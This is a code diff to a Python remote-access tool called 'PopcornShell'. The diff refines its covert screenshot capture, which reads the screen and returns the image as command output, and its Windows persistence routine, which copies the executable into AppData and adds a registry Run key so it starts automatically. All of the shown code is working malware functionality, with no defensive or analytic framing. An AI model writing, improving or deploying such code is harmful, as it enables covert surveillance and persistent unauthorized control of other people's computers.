@@ -35,15 +35,17 @@ def run_custom_command(cmd: str) -> CommandPayload:
         except:
             result.stderr = "Cannot open file " + file_name
     elif cmd[1] == "screen":
-        with mss.mss() as sct:
-            file_name = sct.shot(mon=-1)
-            sct.save(file_name)
-        with open(file_name, 'rb') as file:
-            file_data = file.read()
-            result.file = file_data
-            result.file_name = file_name
-        os.remove(file_name)
-        result.stdout = "Working on this feature"
+        try:
+            with mss.mss() as sct:
+                file_name = sct.shot(mon=-1)
+                sct.save(file_name)
+            with open(file_name, 'rb') as file:
+                file_data = file.read()
+                result.file = file_data
+                result.file_name = file_name
+            os.remove(file_name)
+        except:
+            result.stderr = "Cannot take screenshot"
     return result
 
 
@@ -107,11 +109,13 @@ def run_command(cmd):
     return payload
 
 def clone_self():
-    path = os.environ["AppData"] + "\\PopcorenShell.exe"
-    if not os.path.exists(path):
-        shutil.copyfile(sys.executable, path)
-        cmd = f"reg add HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v PopcornShell /t REG_SZ /d \"{path}\""
-        subprocess.call(cmd, shell=True)
+    if os.name == "nt":
+        # Clone and start up on windows
+        path = os.environ["AppData"] + "\\PopcorenShell.exe"
+        if not os.path.exists(path):
+            shutil.copyfile(sys.executable, path)
+            cmd = f"reg add HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v PopcornShell /t REG_SZ /d \"{path}\""
+            subprocess.call(cmd, shell=True)
 
 
 def main():
